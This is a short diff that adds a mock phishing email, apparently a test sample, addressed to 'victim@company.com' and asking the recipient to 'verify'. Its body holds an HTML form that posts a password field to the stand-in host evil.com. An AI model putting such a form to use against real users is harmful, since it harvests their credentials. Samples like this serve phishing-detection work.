@@ -1,0 +1,5 @@
+Subject: Verification 26
+From: verify@external.com
+To: victim@company.com
+
+Please verify. <form action='http://evil.com/26' type='password'></form>
